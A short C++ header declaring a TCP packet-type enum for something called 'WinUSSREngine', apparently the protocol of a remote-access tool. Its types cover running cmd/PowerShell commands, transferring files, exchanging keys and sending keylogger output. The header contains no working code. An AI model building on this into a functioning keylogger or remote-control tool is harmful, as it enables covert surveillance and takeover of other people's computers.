#pragma once

namespace WinUSSREngine::TCP
{
	enum class PacketType
	{
		AppCommand,						// Send to activate app commands
		CMDCommand,						// Send to use cmd/pws commands
		Warning,						// Sent just in case if shutting down.
		ChatMessage,					// Sent to server from client, response strs
		FileTransferRequestFile,		// Sent to request a file
		FileTransfer_EndOfFile,			// Sent for when file transfer is complete
		FileTransferByteBuffer,			// Sent before sending a byte buffer for file transfer
		FileTransferRequestNextBuffer,  // Sent to request the next buffer for file
		Keylogger,						// Sent specifically for keylogger output
		UserInformation,				// Use this for client name & key exchange
		AuthKeyTest						// For testing out how the auth key will work (TODO: REMOVE)
	};
}